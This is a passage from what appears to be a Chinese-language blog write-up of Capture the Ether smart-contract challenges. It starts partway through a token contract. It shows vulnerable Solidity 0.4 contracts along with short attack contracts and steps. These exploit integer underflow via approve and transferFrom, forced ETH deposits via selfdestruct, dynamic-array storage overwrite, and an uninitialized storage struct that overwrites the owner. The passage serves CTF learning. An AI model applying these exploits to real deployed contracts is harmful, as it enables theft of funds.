从调用者的余额中扣除转账金额。        balanceOf[to] += value;        // 将转账金额添加到接收者的余额中。        emit Transfer(msg.sender, to, value);        // 触发 Transfer 事件。    &#125;    function transfer(address to, uint256 value) public &#123;        // 公共函数，允许用户转账代币。        require(balanceOf[msg.sender] &gt;= value);        // 确保调用者的余额足够。        require(balanceOf[to] + value &gt;= balanceOf[to]);        // 确保接收者的余额不会溢出。        _transfer(to, value);        // 调用内部的 _transfer 函数执行转账。    &#125;    event Approval(address indexed owner, address indexed spender, uint256 value);    // 定义一个事件，用于记录代币的授权操作。    function approve(address spender, uint256 value) public &#123;        // 公共函数，允许用户授权其他地址使用自己的代币。        allowance[msg.sender][spender] = value;        // 设置授权金额。        emit Approval(msg.sender, spender, value);        // 触发 Approval 事件。    &#125;    function transferFrom(address from, address to, uint256 value) public &#123;        // 公共函数，允许用户从另一个地址转移代币（需要授权）。        require(balanceOf[from] &gt;= value);        // 确保转出地址的余额足够。        require(balanceOf[to] + value &gt;= balanceOf[to]);        // 确保接收者的余额不会溢出。        require(allowance[from][msg.sender] &gt;= value);        // 确保调用者有足够的授权额度。        allowance[from][msg.sender] -= value;        // 减少调用者的授权额度。        _transfer(to, value);        // 调用内部的 _transfer 函数执行转账。    &#125;&#125;\n\n\n\n看到这个大额数字我第一时间就想到了溢出，我们注意到 transferFrom 调用了 transfer，而 transfer 扣除的是 msg.sender 的余额，这可能导致溢出。原因在于，在调用 transferFrom 的时候，msg.sender 很可能只是一个没有持币的代理地址，也就是说 msg.sender 的余额可能为 0，此时被扣除一个正数就会发生溢出。\n由合约给的条件，我们初始有1000token，先转600给B\n\n然后用B账户给我授权600\n\n我的账户执行transferFrom。（注意：因为此时value&#x3D;600,msg.sender(我）只有400，所以会发生下溢）\n\n成功获得大量token\n\n\n3.Retirement fund题目要求：取走合约中所有的ETH\npragma solidity ^0.4.21;contract RetirementFundChallenge &#123;    uint256 startBalance;    address owner = msg.sender;    address beneficiary;    uint256 expiration = now + 10 years;    function RetirementFundChallenge(address player) public payable &#123;        require(msg.value == 1 ether);        beneficiary = player;        startBalance = msg.value;    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function withdraw() public &#123;        require(msg.sender == owner);        if (now &lt; expiration) &#123;            // early withdrawal incurs a 10% penalty            msg.sender.transfer(address(this).balance * 9 / 10);        &#125; else &#123;            msg.sender.transfer(address(this).balance);        &#125;    &#125;    function collectPenalty() public &#123;        require(msg.sender == beneficiary);        uint256 withdrawn = startBalance - address(this).balance;        // an early withdrawal occurred        require(withdrawn &gt; 0);        // penalty is what&#x27;s left        msg.sender.transfer(address(this).balance);    &#125;&#125;\n\n注意到从合约中取款的必要条件是 startBalance - address(this).balance &gt; 0 ，startBalance 和合约目前的 balance 都是 1 ETH。我们只需要让合约的 balance 大于 1 ETH，startBalance -   address(this).balance 就会溢出从而使得条件满足。虽然合约中并没有充值函数，也没有 payable fallback 函数，但是我们可以使用 selfdestruct 强制向合约中转入 ETH。\n所以直接写自爆合约就行\ncontract destruct&#123;    function kill()public payable&#123;        selfdestruct(msg.sender);    &#125;&#125;\n\n\n成功\n\n4.Mapping题目要求我们把isComplete条件改为true\npragma solidity ^0.4.21;contract MappingChallenge &#123;    bool public isComplete;    uint256[] map; //一个动态数组，用于存储键值对。数组的索引（key）相当于键，数组的值（value）相当于值。    function set(uint256 key, uint256 value) public &#123;        // Expand dynamic array as needed        if (map.length &lt;= key) &#123;            map.length = key + 1;        &#125;        map[key] = value;    &#125;    function get(uint256 key) public view returns (uint256) &#123;        return map[key];    &#125;&#125;contract Attack &#123;    bytes32 public output;    uint256 public result;    function attack()public &#123;        output = keccak256(bytes32(1));        result = 2**256-1-uint256(output)+1;            &#125;    //动态数组的存储方式是：slot【1】存储数组的长度，数组的data存储在：keccak256(bytes(1))+x，x就是数组的下标。    //但是solidty一共有2^256个插槽，也就是说动态数组的存储范围覆盖了整个插槽范围，也就是说我们可以找到数组data起始位置推出slot[0]的位置，然后修改slot[0]数据。&#125;\n\n\nresult就是我们算出来的slot[0]的位置，带入set方法，在solidity中0为false，ture为1，value输入1\n\n完成\n\n5.Donation题目要求我们把ETH全部取走\npragma solidity ^0.4.21;contract DonationChallenge &#123;    struct Donation &#123;        uint256 timestamp;        uint256 etherAmount;    &#125;    Donation[] public donations;    address public owner;    function DonationChallenge() public payable &#123;        require(msg.value == 1 ether);        owner = msg.sender;    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function donate(uint256 etherAmount) public payable &#123;        // amount is in ether, but msg.value is in wei        uint256 scale = 10**18 * 1 ether;        require(msg.value == etherAmount / scale);        Donation donation;        donation.timestamp = now;        donation.etherAmount = etherAmount;        donations.push(donation);    &#125;    function withdraw() public &#123;        require(msg.sender == owner);        msg.sender.transfer(address(this).balance);    &#125;&#125;\n\n问题是在于结构体的声明并没有初始化，就没有赋予存储空间，所以slot[0]是Donation【】，slot[1]是owner。\n然后为结构体在函数内非显式地初始化的时候会使用storage存储而不是memory，所以就可以达到变量覆盖的效果，显然此处donate函数中初始化donation结构体的过程存在问题，我们可以覆盖solt 0和slot 1处1存储的状态变量\n攻击合约就是计算下数据\ncontract Attack&#123;\tuint256 public res;\tuint256 public addr;\tfunction att()public&#123;       addr=uint256(msg.sender);       res=addr/(10**36);   &#125;&#125;\n\n\n计算出来的res就是输入的value,addr就是etherAmount\n先调用withdraw再调用donate，完成\n\n","categories":["CaptureTheEther"],"tags":["Test"]}]